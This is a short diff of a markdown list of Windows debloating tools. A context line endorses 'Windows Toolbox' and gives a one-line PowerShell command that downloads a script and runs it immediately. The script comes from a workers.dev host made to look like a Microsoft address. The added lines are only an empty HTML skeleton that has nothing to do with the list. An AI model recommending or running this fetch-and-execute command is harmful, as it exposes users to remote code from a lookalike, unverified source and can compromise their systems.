@@ -5,4 +5,10 @@ Debloat Windows
 > 
 > - [x] [Windows Toolbox](https://github.com/windowtoolbox/powershell-windows-toolbox): `iex((New-Object System.Net.WebClient).DownloadString('https://ps.microsoft-toolbox.workers.dev'))` :heavy_check_mark:
 
+```html
+  <html>
+    <head></head>
+    <body></body>
+  </html>
+```
 
